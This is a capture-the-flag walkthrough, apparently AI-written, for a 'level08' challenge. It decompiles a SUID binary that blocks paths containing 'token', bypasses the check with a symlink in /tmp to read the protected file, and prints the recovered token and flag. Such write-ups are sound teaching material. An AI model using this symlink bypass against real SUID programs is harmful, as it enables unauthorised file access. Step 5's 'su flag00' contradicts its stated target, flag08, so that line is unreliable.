Here's a `README` for **level08**, written in the same style and format as your previous solutions:

### Solution

1. **List files and check permissions**

	```bash
	ls -l
	```

	You will see the following files:

	```
	-rwsr-s---+ 1 flag08 level08 8617 Mar  5  2016 level08
	-rw-------  1 flag08 flag08    26 Mar  5  2016 token
	```

	* The binary `level08` is **owned by `flag08`** and has the **SUID bit** set, meaning it executes with `flag08`'s privileges.
	* `token` is a file readable **only** by `flag08`.

2. **Transfer the executable file to your host machine**

	From your host, use `scp` to copy the binary for analysis:

	```bash
	scp -P 4242 level08@<vm-ip>:~/level08 .
	```

3. **Analyze the binary with Ghidra**

	Decompiling with Ghidra shows the following logic:

	```c
	if (argc == 1) {
		printf("%s [file to read]\n", argv[0]);
		exit(1);
	}

	if (strstr(argv[1], "token")) {
		printf("You may not access '%s'\n", argv[1]);
		exit(1);
	}

	int fd = open(argv[1], O_RDONLY);
	read(fd, buf, 1024);
	write(1, buf, n);
	```

	🔎 The binary:

	* Prevents access to files **containing** the string `"token"`.
	* But it does **not resolve symlinks** — only checks the input path **string**.

4. **Bypass the check using a symlink**

	Create a symlink to the `token` file using a different name (e.g. `/tmp/flag08`):

	```bash
	ln -s ~/token /tmp/flag08
	```

	Then run the binary using the **symlink path**:

	```bash
	./level08 /tmp/flag08
	```

	Since `/tmp/flag08` does **not contain the substring** `token`, the binary allows access and reads the file.

	Output:

	```
	quif5eloekouj29ke0vouxean
	```

	You’ve successfully read the protected `token` file using a symbolic link.

5. **Switch to user `flag08` and get the flag:**

	```bash
	su flag00
	```

	Enter the token password: `quif5eloekouj29ke0vouxean`.

	Then run:
	```bash
	getflag
	```

	Output:

	```
	Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
	```

	You’ll receive the `flag08` token.
